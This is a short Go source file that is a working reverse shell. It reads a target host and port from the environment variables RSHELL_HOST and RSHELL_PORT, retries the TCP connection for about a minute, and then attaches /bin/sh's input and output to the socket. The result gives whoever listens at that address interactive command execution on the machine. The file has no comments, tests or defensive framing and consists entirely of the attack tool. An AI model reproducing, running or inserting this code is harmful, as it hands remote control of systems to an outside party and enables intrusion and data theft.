package main

import (
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {
	host := os.Getenv("RSHELL_HOST")
	port := os.Getenv("RSHELL_PORT")

	if host == "" || port == "" {
		os.Exit(1)
	}

	address := net.JoinHostPort(host, port)

	var connection net.Conn
	var err error

	for attempt := 0; attempt < 30; attempt++ {
		dialer := net.Dialer{Timeout: 5 * time.Second}
		connection, err = dialer.Dial("tcp", address)
		if err == nil {
			break
		}
		time.Sleep(2 * time.Second)
	}

	if connection == nil {
		os.Exit(1)
	}
	defer connection.Close()

	shell := exec.Command("/bin/sh")
	shell.Stdin = connection
	shell.Stdout = connection
	shell.Stderr = connection

	shell.Run()
}
